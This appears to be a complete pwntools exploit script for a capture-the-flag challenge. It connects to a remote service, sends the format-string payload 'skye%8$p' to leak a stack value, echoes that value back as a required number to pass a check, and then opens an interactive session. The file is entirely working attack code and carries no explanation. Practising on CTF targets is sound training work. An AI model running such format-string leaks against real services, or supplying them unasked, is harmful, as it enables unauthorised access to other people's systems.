from pwn import *
context.log_level = 'debug'

# p = process("./scmt")
p = remote("node2.hackingfor.fun",37597)

# gdb.attach(p,"b *0x400B32")

p.recvuntil("name:\n")
payload = "skye%8$p"
p.send(payload)

p.recvuntil("skye")
token = int(p.recv(8),16)
log.info("token:"+hex(token))

p.recvuntil("number:\n")
payload = str(token)
p.sendline(payload)


p.interactive()